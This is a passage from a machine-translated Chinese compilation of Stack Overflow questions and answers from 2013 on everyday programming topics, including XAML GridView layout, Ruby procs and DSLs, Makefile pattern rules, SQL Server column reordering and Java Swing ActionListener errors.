            </ItemsPanelTemplate>
        </GridView.ItemsPanel>
    </GridView>
</Grid> 
```

C# 代码

```
protected override void OnNavigatedTo(NavigationEventArgs e)
{
    var ObserControl = new ObservableCollection<string>() { "Item 1", "Item 2", "Item 3", "Item 4", "Item 5"};
    MyGv.ItemsSource = ObserControl;
    MyGv1.ItemsSource = ObserControl;
} 
```

如果您需要更多帮助，请告诉我。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-26T18:40:32.653

正如[Xyroid](https://stackoverflow.com/users/1230188/xyroid)建议的那样，拥有两个 GridView 可以解决这个问题。只是做了一些修改以达到预期的效果。

xml:

```
<Grid Background="{StaticResource ApplicationPageBackgroundThemeBrush}">
    <Grid.RowDefinitions>
        <RowDefinition Height="50" />
        <RowDefinition Height="50" />
    </Grid.RowDefinitions>
    <GridView x:Name="MyGv" Margin="0"  Grid.Row="0" Width="650">
        <GridView.ItemTemplate>
            <DataTemplate>
                <Border Height="50" Width="200" Background="Gray">
                    <TextBlock FontSize="26.667" Text="{Binding}" VerticalAlignment="Center" HorizontalAlignment="Center"/>
                </Border>
            </DataTemplate>
        </GridView.ItemTemplate>
        <GridView.ItemsPanel>
            <ItemsPanelTemplate>
                <VariableSizedWrapGrid Orientation="Horizontal" MaximumRowsOrColumns="2"/>
            </ItemsPanelTemplate>
        </GridView.ItemsPanel>
    </GridView>
    <GridView  x:Name="MyGv1" Margin="0" Height="60" Width="650" Grid.Row="1">
        <GridView.ItemTemplate>
            <DataTemplate>
                <Border Height="50" Width="200"  Background="Gray">
                    <TextBlock FontSize="26.667" Text="{Binding}" VerticalAlignment="Center" HorizontalAlignment="Center"/>
                </Border>
            </DataTemplate>
        </GridView.ItemTemplate>
        <GridView.ItemsPanel>
            <ItemsPanelTemplate>
                <VariableSizedWrapGrid Orientation="Vertical" MaximumRowsOrColumns="3"/>
            </ItemsPanelTemplate>
        </GridView.ItemsPanel>
    </GridView>
</Grid> 
```

C＃：

```
protected override void OnNavigatedTo(NavigationEventArgs e)
    {

        var ObserControl = new ObservableCollection<string>() { "Item 1", "Item 2", "Item 3", "Item 4", "Item 5" };
        MyGv.ItemsSource = ObserControl.Take(2);
        MyGv1.ItemsSource = ObserControl.Skip(2);
    } 
```

# iphone - 在一个圆圈中布局动态精灵数量

> ID：15562851
> 
> 赞同：0
> 
> 时间：2013-03-22T04:39:08.493
> 
> 标签：iphone, ios, cocos2d-iphone

我想创建一个固定大小的圆圈，其上将放置不同数量（6-12 个）的矩形精灵。我读过一个名为 drawCircle 的 cocos2d 函数，它非常适合显示一个圆圈。我想显示一个圆圈，但我也想在它上面包含矩形精灵，根据精灵的数量均匀分布。有没有一个函数可以将矩形精灵布置成一个圆圈？

![带有矩形精灵的圆形示例。](../Images/77947b32cdd5eb9a00f2f40bd903ff36.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T04:50:07.903

我在你的未来看到了一点三角学！也许使用绘图函数绘制圆，然后计算每个框的中心点？

显然，您需要知道圆的半径，但是从那里开始应该很简单。看起来您想以 45 度角放置它们。所以第一个盒子将被放置在点`(radius, 0)`，第二个在`(radius*cos(45), radius*sin(45))`，第三个在`(0, radius)`，等等。

上述数学假设标准逆时针旋转 0-360 度。您也可以使用弧度 - 然后您将计算所有这些点`theta = 0, pi/4, pi/2, 3pi/4, pi, 5pi/4, 3pi/2, and 7pi/4`

基本上是圆心是`x0, y0`，你的计算点将是`(x0 + radius*cos(theta), y0 + radius*sin(theta))`

那里应该是相当简单的数学:)

# function - 从 vbscript 中的函数返回二维数组

> ID：15562862
> 
> 赞同：3
> 
> 时间：2013-03-22T04:40:42.873
> 
> 标签：function, multidimensional-array, vbscript, return

我正在处理的程序有问题。我想做的是让一个函数接受来自用户的输入并将该数据存储在一个数组中以用于小型测试目的它是一个 3 x 3 数组我已经通过回显所有存储的值使函数中的数组按测试工作. 但是，当我尝试将数组返回到调用它的子时，我得到不匹配错误，我不确定我做错了什么。

```
 Sub SubroutineA()
          Dim Array(2,2)

          Array = GetInfo()

    End Sub

    Function GetInfo()
          Dim FunctionArray(2,2)
          {input all data into array}
          GetInfo = FunctionArray()
    End Function 
```

我能得到的任何帮助都会很棒，因为这对我来说是新的。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-22T12:33:57.440

Cheran Shunmugavel 指出了正确的方向，但他的解释含糊不清。说清楚：

```
Sub SubroutineA()
      Dim Arr     ' <<<--- do not use parenthesis here and do not use
                  '        the reserved keyword "Array"
      Arr = GetInfo()
End Sub

Function GetInfo()
      Dim FunctionArray(2,2)
      ' {input all data into array}
      GetInfo = FunctionArray     ' <<<--- do not use parenthesis here
End Function 
```

# algorithm - 算法：从每个列表中选择一个数字，找到最大的和

> ID：15562875
> 
> 赞同：3
> 
> 时间：2013-03-22T04:41:44.117
> 
> 标签：algorithm

如果我们有n个列表，我们需要从每个列表中选择一个数字，选择的数字不能再次选择，如何进行选择以获得n个选择的数字的最大和？例如

```
list1:  4 5 7.
list2:  3 5 7.
list3:  1 5 
```

如果我们从list1中选择7，我们可以在列表2中选择的最大数字是5（因为相同的数字不能选择两次），如果我们从list2中选择5，我们只能从list3中选择1，所以总和是`7+5+1=13`

这不是最好的选择。但是，如果我们从 list1 中选择 4，从 list2 中选择 7，从 list3 中选择 5，则总和为`4+7+5=16`

是否有一种算法可以找到最佳选择方式以获得最大的总和？解决方案应该是完美的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-22T06:19:56.323

没有直接的算法，但是，可以通过修改匈牙利算法在多项式时间内解决该问题。[维基](http://en.wikipedia.org/wiki/Hungarian_algorithm)

> 给定一个非负 n×n 矩阵，其中第 i 行第 j 列中的元素表示将第 j 个工作分配给第 i 个工人的成本。我们必须找到成本最低的工作分配给工人。如果目标是找到产生最大成本的分配，则可以通过将每个成本替换为减去成本的最大成本来更改问题以适应设置。

构造维度为 (K*K) 的矩阵，其中 K=max(n,列表中元素的最大数量)。

例如：

```
List 1=1 2 3 4
List 2=5
List 3=9 10

The K*K matrix is:
1 2  3 4
5 0  0 0
9 10 0 0
0 0  0 0 
```

将以下算法[http://en.wikipedia.org/wiki/Hungarian_algorithm#Setting](http://en.wikipedia.org/wiki/Hungarian_algorithm#Setting)应用于上述矩阵。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-22T16:27:08.983

由于我们已经对列表进行了排序并且列表的所有成员都是正数，因此列表中的最大数量应该在结果列表中。您还应该假设列表中的数字不会重复。否则没有意义。

```
List1 : 2 2 2 
List2 : 2 2 
```

我们不需要迭代列表中的所有数字。在最坏的情况下，我们会遇到以前见过的 n-1 个数字。喜欢：

```
list1: 5 6 7
list2: 5 6 7
list3: 5 6 7 
```

所以，我会这样做；

```
for list in lists:
   max = list[len(list)] 
   possible_result.append(max)
   for j = len(list) to j = len(list)-n in other lists:
      max = list[j]
      if not max exist in possible_result:
          append to possible_result
Find largest possible_result 
```

第一次迭代将运行 n 次第二次，在最坏的情况下，n-1 次。

# jquery - 淡出+移除（表格行）后的功能不起作用？

> ID：15562877
> 
> 赞同：0
> 
> 时间：2013-03-22T04:42:08.070
> 
> 标签：jquery, fadeout

[我从这段代码jquery 表行总计和总计](https://stackoverflow.com/questions/12324928/jquery-table-rows-line-totals-and-grand-total)中添加了淡出 + 删除，但是`UpdateTotals(this)`停止工作。非常感谢一些帮助。

非常感谢

```
$('body').delegate('.delete', 'click', function() {          
//$(this).parents('tr').remove(); // UpdateTotals works fine
$(this).parents('tr').fadeOut('normal', function() { $(this).remove()}); //UpdateTotals won't work
UpdateTotals(this);
}); 
```

# jakarta-ee - 调用远程 EJB 的最佳方式

> ID：15562879
> 
> 赞同：1
> 
> 时间：2013-03-22T04:42:28.347
> 
> 标签：jakarta-ee, java-ee-6

我正在努力提高我对远程 EJB 调用的理解。

我有这样的代码，它在我的服务器上进行远程 JNDI 查找：

```
private InitialContext jndiContext;    
private AdderBeanRemote bean1;

Properties props = new Properties();
props.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.enterprise.naming.SerialInitContextFactory");
props.setProperty("org.omg.CORBA.ORBInitialHost", "10.0.0.99");
props.setProperty("org.omg.CORBA.ORBInitialPort", "3700");
jndiContext = new InitialContext(props);
bean1 = (AdderBeanRemote) jndiContext.lookup("com.suspectclass.sgifford.test8bean.AdderBeanRemote"); 
```

但这似乎很复杂，并且将大量特定于应用程序的数据硬编码到我的应用程序中；例如，如果我想使用不同的服务器或重新编号我的网络，我将不得不修改我的应用程序，然后重新编译和重新部署。

我见过一些使用“jndi.properties”的解决方案，但到目前为止我还没有任何工作，无论如何这仍然需要我重新编译和重新部署以更改任何内容。

有没有一种更简单的方法，不需要将我的网络详细信息硬编码到我的应用程序中？或者这是我能做的最好的吗？

谢谢！

-----斯科特。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T05:55:08.377

我认为外部 .properties 文件是避免重新编译的方法。

该文件可以在打包的 .jar 之外作为文件系统中的单独文件

或打包到您带入类路径的“configuration-resources.jar”中。[这个](https://stackoverflow.com/questions/1318347/how-to-use-java-property-files)问题涵盖了在一些不同的部署场景中读取属性的基础知识

如果您想深入了解 jndi.properties，请在[oracle](http://docs.oracle.com/javase/jndi/tutorial/beyond/env/source.html)阅读更多内容，我想使用 jndi.properties 是更推荐的方式，因为您避免以编程方式读取属性。但是您可以通过从文件系统中读取自制的 .properties 文件来获得更快的结果。

# ruby - 如何在 Ruby 中创建这个小 DSL？

> ID：15562888
> 
> 赞同：4
> 
> 时间：2013-03-22T04:43:23.633
> 
> 标签：ruby, lambda, dsl, proc

我的职能是：

```
def hello(str)
  puts "hello #{str}"
end

def hello_scope(scope, &block)
  # ???
end 
```

我想在我的方法块中临时增加一个函数。

在`hello_scope`中，我只是想在将`scope`字符串`str`传递给原始`hello`方法之前将其添加到之前。这是一个例子：

```
hello 'world'               #=> hello world

hello_scope "welcome!" do
  hello 'bob'               #=> welcome!hello bob
  hello 'alice'             #=> welcome!hello alice
end 
```

当谈到 Ruby 中的这种事情时，我是个菜鸟。有人可以帮助我以优雅的方式解决这个问题吗？

* * *

编辑：

如果它使事情变得更容易，我们可以将方法作为参数传递给块，例如：

```
hello_scope "welcome!" do |h|
  h "bob"                     #=> welcome!hello bob
  h "alice"                   #=> welcome!hello alice
end 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-22T07:25:10.157

一种方法是创建一个“评估上下文对象”，块将在该对象上进行实例评估。该对象必须提供特定于块的所有方法。在下面的示例中，我没有使用相同的名称，因为我不记得如何显式引用全局方法“hello”（以避免无限递归）。在适当的库中，“hello”将在某处定义为类方法，因此这不是问题。

例如

```
def hello(str)
  puts "hello #{str}"
end
class HelloScope
  def h(str)
    print scope
    hello(str)
  end
end
def hello_scope(scope, &block)
  HelloScope.new(scope).instance_eval(&block)
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T08:14:02.077

只需修改您的“hello”方法以考虑当前范围：

```
class Greeter
  def initialize
    @scope = nil
  end

  def hello(str)
    puts "#{@scope}hello #{str}"
  end

  def with_scope(scope)
    @scope = scope
    yield
    @scope = nil
  end
end

Greeter.new.instance_eval do
  hello 'world'               #=> hello world

  with_scope "welcome!" do
    hello 'bob'               #=> welcome!hello bob
    hello 'alice'             #=> welcome!hello alice
  end
end 
```

# jboss7.x - 我们可以在 JBoss AS 7 中将 Web 应用程序部署为文件夹而不是 war 文件吗

> ID：15562898
> 
> 赞同：0
> 
> 时间：2013-03-22T04:44:41.587
> 
> 标签：jboss7.x

我有两个疑问 1\. 我可以在 JBoss AS 7 中将 Web 应用程序部署为文件夹而不是 war 文件吗？2\. 如果没有，如何在不重新构建/部署war文件的情况下更新JSP或html或js文件？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T05:05:33.897

JBoss 支持部署归档文件或作为展开目录的能力。要展开 Java EE 存档，请将存档解压缩到与存档文件**同名**的目录。只要目录名具有正确的扩展名（.war、.ear 等），JBoss 就会正常部署目录。因此，如果您的 war 文件具有 name `HelloWorld.war`，那么您的分解目录名称也应该是`HelloWorld.war`。

另请注意，建议`deployment-scanner`在`standalone.xml`配置文件中编辑您的并将`auto-deploy-exploded`属性更改回**false**以进行展开部署。引用[JBoss 7.1 文档](https://docs.jboss.org/author/display/AS71/Application+deployment)：

> 强烈建议对展开的内容使用手动部署模式，因为展开的内容本身就容易受到试图自动部署部分复制内容的扫描仪的攻击。

**编辑：**

请参阅链接[https://community.jboss.org/thread/200114](https://community.jboss.org/thread/200114)。看起来这是 JBoss 7.1.1 中已确认的错误，即 JBoss 忽略 jsp-configuration 中的配置并且不会重新加载修改后的 jsp。它已在 7.1.2 中修复。您需要自己构建 7.1.2 每晚构建。或者，如果您有企业支持，请联系 JBoss 支持。

# java - 与 Java 泛型和子类混淆

> ID：15562901
> 
> 赞同：1
> 
> 时间：2013-03-22T04:45:33.007
> 
> 标签：java, generics, wildcard, subclassing

我有以下内容：

*   一个抽象类`BaseScore`
*   `LevelScore`这是一个子类`BaseScore`

然后我有：

*   一个抽象类`BaseScoreRecord`

    ```
    public abstract class BaseScoreRecord<T extends BaseScore> {
         public BaseScoreRecord(){
            init();
         }

         protected T[] mScoreHistory;
         protected int count=0;
         protected float finalScore;

         protected abstract void calcFinalScore();
         protected abstract void init();

         public float getFinalScore() {
             return mFinalScore;
         }

         public void addScoreRecord(T score){
             mScoreHistory[count] = score;
             count++;
         }
    } 
    ```

*   ...`MyScoreRecord`这是一个子类`BaseScoreRecord`

    ```
    public class MyScoreRecord extends BaseScoreRecord<LevelScore> {
         public MyScoreRecord(){
            init();
         }

         @Override
         protected void calcFinalScore(){
             //Does some stuff to calc final score from mScoreHistory
         }

         @Override
         protected void init(){
             mScoreHistory = new LevelScore[10];
             for (int i=0;i<mScoreHistory.length;i++){
                 mScoreHistory[i] = new LevelScore();
             }
         };
    } 
    ```

所以，然后我有`BaseGame`以下行：

```
protected BaseScoreRecord<? extends BaseScore> endGameRecord; 
```

...并且`MyGame`它是`BaseGame`. `MyGame`包括以下方法：

```
@Override
protected void gameInit(){
    endGameRecord = new MyScoreRecord();  //endGameRecord initialised
}

protected void addLevelScore(LevelScore ls){
    mEndGameRecord.addScoreRecord(ls);
} 
```

最后一种方法出现编译器错误：

```
The method addScoreRecord(capture#3-of ? extends BaseScore) 
in the type BaseScoreRecord <capture#3-of ? extends BaseScore>
is not applicable for the arguments (LevelScore) 
```

...所以我显然在泛型、通配符和子类方面做错了。如果我丢失了泛型，`BaseGame`并且`MyGame`它似乎在没有任何讨厌的 ClassCastException 错误的情况下运行。任何指针将不胜感激。也许我把事情弄得太复杂了？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:56:38.597

您应该声明它`MyScoreRecord`实际上是 的子类`BaseScoreRecord`，并正确参数化它：

```
public class MyScoreRecord extends BaseScoreRecord<LevelScore> 
```

例如，如果您使用 Eclipse，您将收到警告，因为`@Override`注释实际上并未覆盖任何内容。以上也将使编译器强制执行`LevelScore`extends `BaseScore`。

# sql-server - 使用 T-SQL 查询永久更改表中的列顺序

> ID：15562906
> 
> 赞同：0
> 
> 时间：2013-03-22T04:46:00.213
> 
> 标签：sql-server

我的桌子是`student_register`并且有四列

```
1\. srno 
2\. firstname
3\. lastname
4\. middlename 
```

我希望`middlename`使用 SQL Server 2005 查询在表中永久位于第三位的列。

谢谢你。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T04:53:39.607

如果不删除并阅读表格，就无法做你想做的事。要了解 Management Studio 是如何做到这一点的（至少在 2012 年，但我认为这也适用于 2005 年），请转到 Management Studio 的`Options`> `Designers`> `Table and Database Designer`> Uncheck `Prevent saving changes that require table re-creation`。

完成此操作后，您可以进入表设计器，更改列的顺序，而不是单击“保存”，单击“保存更改脚本”以查看 SQL。

以下是 SQL 2012 将生成的内容：

```
/* To prevent any potential data loss issues, you should review this script in detail before running it outside the context of the database designer.*/
BEGIN TRANSACTION
SET QUOTED_IDENTIFIER ON
SET ARITHABORT ON
SET NUMERIC_ROUNDABORT OFF
SET CONCAT_NULL_YIELDS_NULL ON
SET ANSI_NULLS ON
SET ANSI_PADDING ON
SET ANSI_WARNINGS ON
COMMIT
BEGIN TRANSACTION
GO
CREATE TABLE dbo.Tmp_Table_1
    (
    TEst1 nchar(10) NULL,
    Test3 nchar(10) NULL,
    Test2 nchar(10) NULL
    )  ON [PRIMARY]
GO
ALTER TABLE dbo.Tmp_Table_1 SET (LOCK_ESCALATION = TABLE)
GO
IF EXISTS(SELECT * FROM dbo.Table_1)
     EXEC('INSERT INTO dbo.Tmp_Table_1 (TEst1, Test3, Test2)
        SELECT TEst1, Test3, Test2 FROM dbo.Table_1 WITH (HOLDLOCK TABLOCKX)')
GO
DROP TABLE dbo.Table_1
GO
EXECUTE sp_rename N'dbo.Tmp_Table_1', N'Table_1', 'OBJECT' 
GO
COMMIT 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T04:52:14.273

由于这是一次性的，最简单的方法是为此使用 Visual Database Tools

**[如何：更改列顺序 (Visual Database Tools)](http://msdn.microsoft.com/en-us/library/aa337556%28v=sql.90%29.aspx) SQL Server 2005**

*   在对象资源管理器中，右键单击包含要重新排序的列的表，然后单击设计（在 SP1 或更早版本中修改）。该表在表设计器中打开。
*   选择要重新排序的列名称左侧的框。
*   将该列拖到表中的另一个位置。

要在 TSQL 中执行此操作，您需要：

*   创建具有正确列顺序的临时表
*   将数据从原始表插入临时表
*   删除原始表
*   将临时表重命名为原始名称

# jquery - Javascript 菜单在不同浏览器中的阻塞

> ID：15562907
> 
> 赞同：1
> 
> 时间：2013-03-22T04:46:00.573
> 
> 标签：jquery, asp.net, css, cross-browser

我用这样的javascript创建了一个菜单..

**代码**：

```
<script type="text/javascript" language="javascript" src="js/jquery.js"></script>
<script type="text/javascript">
   $(document).ready(function () {
       //slides the element with class "menu_body" when paragraph 
       //with class "menu_head" is clicked
       $("#firstpane p.menu_head").click(function () {
              $(this).css({ backgroundImage: "url('../images/down.png')"        
       }).next("div.menu_body").slideToggle(300).siblings("div.menu_body").slideUp("slow");
       $(this).siblings().css({ backgroundImage: "url('../images/left.png')" });
   });         
</script> 
```

它工作正常。但在不同的浏览器中，有时菜单会被锁定。它在不同的计算机上有所不同。例如：在一个系统上，问题出在 chrome 上，而在另一个系统上，问题出在 Mozilla 上。告诉我有什么问题吗？

# makefile - 隐式规则的先决条件中的通配符

> ID：15562909
> 
> 赞同：2
> 
> 时间：2013-03-22T04:46:06.193
> 
> 标签：makefile

```
BUILT_DIR = /tmp/obj 
SRC = /source/dir  

/tmp/obj/%/builtin.o : $(SRC)/%/*.c
      gcc $^ -o $@ 
```

但你知道：

> 为了应用模式规则，其目标模式必须与所考虑的文件名匹配，并且其所有先决条件（在模式替换之后）必须命名存在或可以生成的文件。

如果我执行`make /tmp/obj/hfa/builtin.o`，make会抱怨：

`make: *** No rule to make target`/tmp/obj/hfa/builtin.o'。停下来。`

如何修改 Makefile 以满足我的要求？</p>

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-22T06:35:33.390

您可以使用二次扩展

```
BUILT_DIR = /tmp/obj 
SRC = /source/dir  
.SECONDEXPANSION:
/tmp/obj/%/builtin.o : $$(wildcard $(SRC)/%/*.c)
      gcc $^ -o $@ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T05:03:05.053

您看到的错误表明没有与模式匹配的 .c 文件，`$(SRC)/hfa/*.c`因为`%`转换为`hfa`. 所以 make 不能使用你定义的规则。

然后 Make 开始使用隐式规则进行构建，它也不会匹配。

最后make放弃了。

我刚刚确认了相同的 Makefile，并且仅当目录中没有`*.c`文件时才会出现相同的错误`$(SRC)/hfa`。

否则，我会看到 gcc 命令被执行。

从你的问题来看，你的要求是什么还不是很清楚。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-07-23T15:27:48.600

对我有用的规则配置：

```
bar-%-foo:
  @touch $@

.SECONDEXPANSION:
foo-%-bar: bar-$$*-foo
  @echo "@: $@"
  @echo "<: $<"
  @touch $@

foo-bar: foo-biz-bar foo-baz-bar
.PHONY: foo-bar 
```

和演示：

```
$:make foo-bar
@: foo-biz-bar
<: bar-biz-foo
@: foo-baz-bar
<: bar-baz-foo
rm bar-biz-foo bar-baz-foo

$:ls | grep foo
foo-baz-bar
foo-biz-bar 
```

# php - 从数据库中收集统计数据

> ID：15562910
> 
> 赞同：0
> 
> 时间：2013-03-22T04:46:15.903
> 
> 标签：php, mysql, modx-revolution

我有一个基于竞争的应用程序，包括（比如说）10 种饼干（饼干）和 6 种饮料。我使用 MODx Revolution 2.2 作为 CMS。

参赛者基本上会指定他们想要哪种饮料并输入条形码（与饼干的类型有关）。

我想在 CMS 中将此作为统计数据呈现出来，但我想为每个`COUNT()`.

```
$biscuit1 = $modx->query("SELECT COUNT(*) FROM my_table WHERE barcode = '1234'");
$biscuit1 = $modx->fetch(PDO::FETCH_ASSOC);
$biscuit1 = $biscuit1[0]; 
```

所以我的问题是：

*   做 16 个数据库查询（可能更多）是不好的做法吗？
*   如果有更好的方法来收集数据集的统计信息，那是什么？

注意：我曾想过创建另一个统计表，我会在其中每小时在一个 cron 作业中运行这些查询。这会有帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:49:43.950

`COUNT(*)`并不是所有的资源密集型。如果`barcode`被索引也会有所帮助。您还可以在一个查询中获取所有条形码的数据，而不必运行 16 个查询，每个查询一个

```
$result = $modx->query("SELECT barcode,COUNT(*) FROM my_table GROUP by barcode"); 
```

# three.js - THREE.js 几何 - 消失的一面

> ID：15562913
> 
> 赞同：1
> 
> 时间：2013-03-22T04:46:26.623
> 
> 标签：three.js

我正在尝试使用 Geometry 制作 3D L 形。

我为顶部 L 推送顶点和面，然后为底部 L 推送，最后使用已经推送的顶点推送侧面的面。

如果我只绘制顶部 L 和底部 L，它们都会出现。但如果我添加边，底部 L 消失。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:51:55.263

THREE.MeshNormalMaterial({side: THREE.DoubleSide})

需要那部分。

# ruby - 返回 procs、lambdas 和 blocks 中的语句

> ID：15562915
> 
> 赞同：11
> 
> 时间：2013-03-22T04:46:31.610
> 
> 标签：ruby, lambda, return, block, proc

我在理解`return`块、procs 和 lambdas 中的工作原理时遇到了很多麻烦。

例如，在以下情况下，为什么`batman_ironman_proc`工作，而`batman_yield`抛出错误？

```
def batman_ironman_proc
  victor = Proc.new { return "Batman will win!" }
  victor.call
  "Iron Man will win!"
end

def batman_yield
    yield
    "Iron man will win!"
end

victor = Proc.new { return "Batman will win!" }

puts batman_ironman_proc 
#batman_yield(&victor) === This code throws an error. 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-22T05:20:51.160

正如链接问题中的[一个答案](https://stackoverflow.com/a/2325630/520779)所示：

> `return`关键字*总是*从当前上下文中的方法或 lambda 返回。在块中，它将从*定义*闭包的方法返回。它不能从*调用*方法或 lambda 中返回。

您的第一个示例是成功的，因为您`victor`在要从中返回的同一函数中定义，因此 a`return`在该上下文中是合法的。在您的第二个示例中，`victor`是在顶层定义的。`return`那么，that 的效果**不会**是从`batman_yield`（调用方法）返回，而是[如果它是有效的]从顶层本身（`Proc`定义的地方）返回。

**澄清：**虽然您可以访问块的返回值（即“块中评估的最后一个表达式的值作为产量的值传递回方法” - 根据您的评论），您**不能**使用关键字，`return`原因如上所述。例子：

```
def batman_yield
    value = yield
    return value
    "Iron man will win!"
end

victor = Proc.new { return "Batman will win!" }
victor2 = Proc.new { "Batman will win!" }

#batman_yield(&victor) === This code throws an error.
puts batman_yield(&victor2) # This code works fine. 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-07-01T02:41:45.293

我来自 C 背景，我将解释它的方式是，当您调用一个函数时，您会设置一个返回指令号和一个将存储返回值的寄存器。在 proc 和 block 的情况下，没有设置返回指令，因为它们是在同一范围内内联或调用的，但它们仍然可以返回返回值，因为它们是独立的功能。因此，如果没有设置返回指令，proc/block 会给我们一个 LocalJumpError，而如果我们只想返回一个值，那很好。

# java - 如何使用非抽象类实现 ActionListener？爪哇

> ID：15562918
> 
> 赞同：3
> 
> 时间：2013-03-22T04:46:53.353
> 
> 标签：java, swing, abstract-class, actionlistener

我最近才开始学习如何使用 swing，并且一直在学习我在网上找到的教程。我基本上按照教程“逐字逐句”进行操作，但出现错误：

> ScoreBoard 不是抽象的，不会覆盖 ActionListener 中的抽象方法 actionPerformed(ActionEvent)

所以我的问题是，如果类不是抽象的，我如何在我的类（记分板）中实现 ActionListener？

这是整个代码：（因为我不知道问题出在哪里）

```
package scoreboard;

import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.*;

public class ScoreBoard implements ActionListener{

//Class Variables
int redScore = 0;
int blueScore = 0;

//Class Objects
JPanel titlePanel, scorePanel, buttonPanel;
JLabel redLabel, blueLabel, redLabelT, blueLabelT;
JButton redButton, blueButton, resetButton;

public static void main(String[] args) {

    SwingUtilities.invokeLater(new Runnable(){
        public void run(){
            createFrame();
        }
    });

}//End Method

public static void createFrame(){

    JFrame frame = new JFrame("ScoreBoard");
    JFrame.setDefaultLookAndFeelDecorated(true);

    ScoreBoard panel = new ScoreBoard();
    frame.setContentPane(panel.contentPane());

    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    frame.setResizable(false);
    frame.setSize(250, 190);
    frame.setVisible(true);

}//End Method

public JPanel contentPane(){

    JPanel basePanel = new JPanel();
    basePanel.setLayout(null);
    basePanel.setBackground(Color.black);

    //Title
    titlePanel = new JPanel();
    titlePanel.setLayout(null);
    titlePanel.setOpaque(false);
    titlePanel.setLocation(10, 0);
    titlePanel.setSize(250, 30);
    basePanel.add(titlePanel);

    redLabelT = new JLabel("Red Team");
    redLabelT.setLocation(0, 0);
    redLabelT.setSize(100, 30);
    redLabelT.setForeground(Color.red);
    redLabelT.setHorizontalAlignment(0);
    titlePanel.add(redLabelT);

    blueLabelT = new JLabel("Blue Team");
    blueLabelT.setLocation(120, 0);
    blueLabelT.setSize(100, 30);
    blueLabelT.setForeground(Color.blue);
    blueLabelT.setHorizontalAlignment(0);
    titlePanel.add(blueLabelT);

    //Score
    scorePanel = new JPanel();
    scorePanel.setLayout(null);
    scorePanel.setOpaque(false);
    scorePanel.setLocation(10, 40);
    scorePanel.setSize(250, 30);
    basePanel.add(scorePanel);

    redLabel = new JLabel("" + redScore);
    redLabel.setLocation(0, 0);
    redLabel.setSize(100, 30);
    redLabel.setForeground(Color.white);
    redLabel.setHorizontalAlignment(0);
    scorePanel.add(redLabel);

    blueLabel = new JLabel("" + blueScore);
    blueLabel.setLocation(120, 0);
    blueLabel.setSize(100, 30);
    blueLabel.setForeground(Color.white);
    blueLabel.setHorizontalAlignment(0);
    scorePanel.add(blueLabel);

    //Buttons
    buttonPanel = new JPanel();
    buttonPanel.setLayout(null);
    buttonPanel.setOpaque(false);
    buttonPanel.setLocation(10, 80);
    buttonPanel.setSize(250, 70);
    basePanel.add(buttonPanel);

    redButton = new JButton("Red Score");
    redButton.setLocation(0, 0);
    redButton.setSize(100, 30);
    redButton.addActionListener(this);
    buttonPanel.add(redButton);

    blueButton = new JButton("Blue Score");
    blueButton.setLocation(120, 0);
    blueButton.setSize(100, 30);
    blueButton.addActionListener(this);
    buttonPanel.add(blueButton);

    resetButton = new JButton("Reset");
    resetButton.setLocation(0, 40);
    resetButton.setSize(220, 30);
    resetButton.addActionListener(this);
    buttonPanel.add(resetButton);

    return basePanel;

   }//End Method

public void actions(ActionEvent e){

    if(e.getSource() == redButton){

        redScore ++;
        redLabel.setText("" + redScore);

    }else if(e.getSource() == blueButton){

        blueScore++;
        blueLabel.setText("" + blueScore);

    }else if(e.getSource() == resetButton){

        redScore = 0;
        blueScore = 0;
        redLabel.setText("" + redScore);
        blueLabel.setText("" + blueScore);

    }

}//End Method

}//End Class 
```

此外，如果您可以解释抽象类是什么，那也会有所帮助，但实际上我只需要知道如何让 JButtons 现在工作......

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-22T04:53:25.080

编译器抱怨是因为您的类*不是*抽象的，但它没有实现它声明要实现的一个或多个方法（特别是 的方法`actionPerformed`）`ActionListener`。我认为您只需要重命名您的`actions`方法：

 ~~~~```
public void actions(ActionEvent e){. . . 
```~~  ~~```
public void actionPerformed(ActionEvent e){. . . 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-22T04:48:00.417

您需要检查是否实现了所有`abstract`方法`ActionListener`。

你缺少定义 `void actionPerformed(ActionEvent e)`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-22T04:49:18.527

将此方法放入您的记分板类中-

```
@Override
public void actionPerformed(ActionEvent ae) {
     // do something
} 
```

如果不希望 ScoreBoard 类实现 ActionListener，也可以通过这种方式添加监听器-

```
redButton.addActionListener(new ActionListener() {
    @Override
    public void actionPerformed(ActionEvent ae) {
         // do something
    }
}; 
```

如果要共享侦听器，请创建其实例并将其添加到所有按钮。

要了解抽象类，请阅读此[http://docs.oracle.com/javase/tutorial/java/IandI/abstract.html](http://docs.oracle.com/javase/tutorial/java/IandI/abstract.html)~~~~

# php - 使用 PHP/SQL 通过 Click 事件处理程序的动态 JavaScript 变量

> ID：15562920
> 
> 赞同：1
> 
> 时间：2013-03-22T04:47:16.593
> 
> 标签：php, javascript, jquery, html, sql

我正在使用 PHP 收集的选项填充一个选择标记，以导入 SQL 表中某个字段的所有行。我表中的一行遵循以下格式：

```
id | wcat | wtype | was | wcc | wbdmin | wbdmax 
```

